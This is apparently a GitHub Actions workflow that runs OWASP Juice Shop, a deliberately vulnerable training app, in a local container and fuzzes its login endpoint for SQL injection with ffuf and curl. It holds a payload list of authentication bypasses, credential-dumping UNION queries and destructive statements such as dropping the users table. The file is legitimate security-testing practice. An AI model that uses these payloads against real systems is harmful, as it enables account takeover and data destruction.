name: Juice Shop SQL Injection Fuzzing

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # Для ручного запуска

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf-sql-injection:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Start Juice Shop container
        run: |
          # Запускаем Juice Shop
          docker run -d \
            --name juice-shop \
            -p 3000:3000 \
            bkimminich/juice-shop:latest
          
          echo "Waiting for Juice Shop to start..."
          # Увеличиваем время ожидания
          sleep 30
          
          # Проверяем доступность
          if curl -s -f http://localhost:3000 > /dev/null; then
            echo "Juice Shop is up and running!"
          else
            echo "WARNING: Juice Shop might not be fully ready, but continuing..."
          fi
          
      - name: Install ffuf
        run: |
          # Устанавливаем ffuf
          wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
          tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
          chmod +x ffuf
          sudo mv ffuf /usr/local/bin/
          
      - name: Prepare payloads from local file
        run: |
          echo "Using local SQL-Injection.txt file for payloads..."
          
          # Создаем папку для payloads
          mkdir -p payloads
          
          # Копируем существующий файл
          cp SQL-Injection.txt payloads/base-payloads.txt
          
          # Добавляем специфичные payloads для SQLite (Juice Shop использует SQLite)
          cat > payloads/sqlite-specific.txt << 'EOF'
          ' OR '1'='1
          ' OR 1=1--
          ' OR 1=1;--
          admin' OR '1'='1
          admin' OR 1=1--
          ' UNION SELECT null,null--
          ' UNION SELECT 1,2--
          ' UNION SELECT username,password FROM users--
          ' OR 1=1 LIMIT 1--
          '; SELECT SLEEP(5)--
          ' OR 1=1 AND (SELECT 1 FROM sqlite_master)--
          ' OR EXISTS(SELECT * FROM sqlite_master)--
          ' OR 1=1 AND (SELECT sql FROM sqlite_master WHERE type='table')--
          admin@juice-sh.op' OR '1'='1
          admin@juice-sh.op' OR 1=1--
          ' OR 'a'='a
          ' OR 'x'='x
          ' IS NULL;--
          '; DROP TABLE users;--
          '; UPDATE users SET password='hacked';--
          admin@juice-sh.op'--
          admin@juice-sh.op' OR '1'='1'--
          ' OR '1'='1' OR '
          ') OR ('1'='1
          ')) OR (('1'='1
          ' OR 1=1 LIMIT 1
          ' OR '1'='1' LIMIT 1
          EOF
          
          # Комбинируем файлы
          cat payloads/base-payloads.txt payloads/sqlite-specific.txt > payloads/all-payloads.txt
          
          # Удаляем пустые строки и дубликаты
          grep -v '^$' payloads/all-payloads.txt | sort -u > payloads/unique-payloads.txt
          
          echo "Total unique payloads: $(wc -l < payloads/unique-payloads.txt)"
          echo "First 10 payloads:"
          head -10 payloads/unique-payloads.txt
          
      - name: Test login endpoint (baseline)
        run: |
          echo "Testing baseline login with invalid credentials..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com","password":"test"}' \
            -o baseline-response.txt \
            -s -w "Status: %{http_code}, Size: %{size_download}, Time: %{time_total}s\n"
          echo "Baseline response saved"
          
      - name: Run ffuf fuzzing
        run: |
          echo "Starting SQL injection fuzzing on login endpoint..."
          echo "Using $(wc -l < payloads/unique-payloads.txt) payloads"
          
          # Создаем простой тест для проверки эндпоинта
          echo "Testing if endpoint is accessible..."
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"test","password":"test"}' \
            -s -w "Status: %{http_code}\n" \
            -o /dev/null
          
          # Фаззинг параметра email - ИЩЕМ ЛЮБЫЕ ОТЛИЧИЯ ОТ БАЗОВОГО ОТВЕТА
          echo -e "\n=== Fuzzing email parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"password"}' \
            -w payloads/unique-payloads.txt \
            -t 5 \
            -p 0.1 \
            -o ffuf-results-email.json \
            -of json \
            -mc 200,201,302,400,401,403,404,500 \
            -v 2>&1 | tee ffuf-output-email.txt
          
          # Фаззинг параметра password
          echo -e "\n=== Fuzzing password parameter ==="
          ffuf -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
            -w payloads/unique-payloads.txt \
            -t 5 \
            -p 0.1 \
            -o ffuf-results-password.json \
            -of json \
            -mc 200,201,302,400,401,403,404,500 \
            -v 2>&1 | tee ffuf-output-password.txt
          
      - name: Analyze results
        run: |
          echo "=== Analyzing fuzzing results ==="
          
          # Устанавливаем jq для анализа JSON
          sudo apt-get update && sudo apt-get install -y jq
          
          # Анализируем результаты для email
          if [ -f "ffuf-results-email.json" ]; then
            echo "1. Analyzing email fuzzing results..."
            
            # Получаем базовый размер ответа (для невалидных учетных данных)
            BASELINE_SIZE=$(stat -c%s baseline-response.txt 2>/dev/null || echo "0")
            echo "Baseline response size: $BASELINE_SIZE bytes"
            
            # Ищем ответы, которые отличаются от базового
            echo "Looking for responses with different size than baseline ($BASELINE_SIZE)..."
            jq -r '.results[] | select(.length != '$BASELINE_SIZE' and .status != 500) | "Payload: \(.input.FUZZ), Status: \(.status), Size: \(.length), Words: \(.words), Lines: \(.lines)"' ffuf-results-email.json > interesting-results-email.txt 2>/dev/null || true
            
            if [ -s "interesting-results-email.txt" ]; then
              echo -e "\nINTERESTING RESULTS FOUND IN EMAIL PARAMETER:"
              cat interesting-results-email.txt
              
              # Сохраняем потенциально успешные payloads
              jq -r '.results[] | select(.status != 401 and .status != 500) | .input.FUZZ' ffuf-results-email.json > potential-success-email.txt 2>/dev/null || true
            else
              echo "No interesting differences found in email parameter"
            fi
          fi
          
          # Анализируем результаты для password
          if [ -f "ffuf-results-password.json" ]; then
            echo -e "\n2. Analyzing password fuzzing results..."
            
            jq -r '.results[] | select(.status != 401 and .status != 500) | "Payload: \(.input.FUZZ), Status: \(.status), Size: \(.length), Words: \(.words), Lines: \(.lines)"' ffuf-results-password.json > interesting-results-password.txt 2>/dev/null || true
            
            if [ -s "interesting-results-password.txt" ]; then
              echo -e "\nINTERESTING RESULTS FOUND IN PASSWORD PARAMETER:"
              cat interesting-results-password.txt
            else
              echo "No interesting differences found in password parameter"
            fi
          fi
          
      - name: Manual SQL injection tests
        run: |
          echo "=== Running targeted manual SQL injection tests ==="
          
          # Создаем файл для результатов ручных тестов
          echo "Manual Test Results for Juice Shop SQL Injection" > manual-test-results.txt
          echo "================================================" >> manual-test-results.txt
          
          # Тест 1: Классическая SQL инъекция (самая простая)
          echo -e "\n1. Testing: ' OR '1'='1"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d '{"email":"'\'' OR '\''1'\''=''\''1","password":"anything"}' \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o test1-response.txt
          echo "Test 1: ' OR '1'='1 -> $(tail -1 test1-response.txt)" >> manual-test-results.txt
          
          # Тест 2: Известный администратор Juice Shop с инъекцией
          echo -e "\n2. Testing: admin@juice-sh.op'--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o test2-response.txt
          echo "Test 2: admin@juice-sh.op'-- -> $(tail -1 test2-response.txt)" >> manual-test-results.txt
          
          # Тест 3: С кавычкой и комментарием
          echo -e "\n3. Testing: admin@juice-sh.op' OR 1=1--"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o test3-response.txt
          echo "Test 3: admin@juice-sh.op' OR 1=1-- -> $(tail -1 test3-response.txt)" >> manual-test-results.txt
          
          # Тест 4: Без пароля, только инъекция в email
          echo -e "\n4. Testing: anything' OR '1'='1"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"anything' OR '1'='1\",\"password\":\"\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o test4-response.txt
          echo "Test 4: anything' OR '1'='1 -> $(tail -1 test4-response.txt)" >> manual-test-results.txt
          
          # Тест 5: Пробуем payload из вашего файла
          echo -e "\n5. Testing: ' OR 'x'='x"
          curl -X POST http://localhost:3000/rest/user/login \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"' OR 'x'='x\",\"password\":\"anything\"}" \
            -s -w "Status: %{http_code}, Size: %{size_download}\n" \
            -o test5-response.txt
          echo "Test 5: ' OR 'x'='x -> $(tail -1 test5-response.txt)" >> manual-test-results.txt
          
          echo -e "\n=== Manual Test Summary ==="
          cat manual-test-results.txt
          
      - name: Get Juice Shop logs
        if: always()
        run: |
          echo "Getting Juice Shop logs..."
          docker logs juice-shop > juice-logs.log 2>&1 || true
          
      - name: Stop Juice Shop container
        if: always()
        run: |
          echo "Stopping Juice Shop container..."
          docker stop juice-shop 2>/dev/null || true
          docker rm juice-shop 2>/dev/null || true
          
      - name: Upload fuzzing results as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sql-injection-results
          path: |
            ffuf-results-*.json
            ffuf-output-*.txt
            interesting-results-*.txt
            potential-success-email.txt
            baseline-response.txt
            test*-response.txt
            manual-test-results.txt
            juice-logs.log
            payloads/
          retention-days: 7
          
      - name: Create summary report
        if: always()
        run: |
          echo "Creating summary report..."
          
          # Считаем общее количество payloads
          if [ -f "payloads/unique-payloads.txt" ]; then
            total_payloads=$(wc -l < payloads/unique-payloads.txt)
          else
            total_payloads="Unknown"
          fi
          
          cat > summary-report.md << EOF
          # SQL Injection Fuzzing Report - Juice Shop
          
          ## Test Details
          - Application: OWASP Juice Shop
          - Target: /rest/user/login (POST)
          - Test Date: $(date)
          - Total Payloads Tested: $total_payloads
          
          ## Results Summary
          EOF
          
          # Проверяем интересные результаты
          if [ -f "interesting-results-email.txt" ] && [ -s "interesting-results-email.txt" ]; then
            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN EMAIL PARAMETER!" >> summary-report.md
            echo "The following payloads produced different responses:" >> summary-report.md
            echo '```' >> summary-report.md
            cat interesting-results-email.txt >> summary-report.md
            echo '```' >> summary-report.md
          else
            echo -e "\n## ✅ No unusual responses found in email parameter" >> summary-report.md
          fi
          
          if [ -f "interesting-results-password.txt" ] && [ -s "interesting-results-password.txt" ]; then
            echo -e "\n## ⚠️ POTENTIAL SQL INJECTIONS FOUND IN PASSWORD PARAMETER!" >> summary-report.md
            echo "The following payloads produced different responses:" >> summary-report.md
            echo '```' >> summary-report.md
            cat interesting-results-password.txt >> summary-report.md
            echo '```' >> summary-report.md
          else
            echo -e "\n## ✅ No unusual responses found in password parameter" >> summary-report.md
          fi
          
          echo -e "\n## Manual Test Results" >> summary-report.md
          if [ -f "manual-test-results.txt" ]; then
            echo '```' >> summary-report.md
            cat manual-test-results.txt >> summary-report.md
            echo '```' >> summary-report.md
          fi
          
          echo -e "\n## Analysis Notes" >> summary-report.md
          echo "1. Juice Shop uses SQLite database" >> summary-report.md
          echo "2. Standard login failure returns HTTP 401" >> summary-report.md
          echo "3. Successful SQL injection would bypass authentication" >> summary-report.md
          echo "4. Look for HTTP 200/302 responses or different response sizes" >> summary-report.md
          
          echo -e "\n## Next Steps" >> summary-report.md
          echo "1. Review the full fuzzing results in the artifacts" >> summary-report.md
          echo "2. Check for Set-Cookie headers in successful responses" >> summary-report.md
          echo "3. Try the successful payloads in a browser manually" >> summary-report.md
          echo "4. Check Juice Shop challenge completion" >> summary-report.md
          
      - name: Upload summary report
        uses: actions/upload-artifact@v4
        with:
          name: summary-report
          path: summary-report.md
